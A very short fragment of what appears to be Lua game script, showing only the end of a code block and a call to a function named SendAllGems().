    end
    SendAllGems()
end
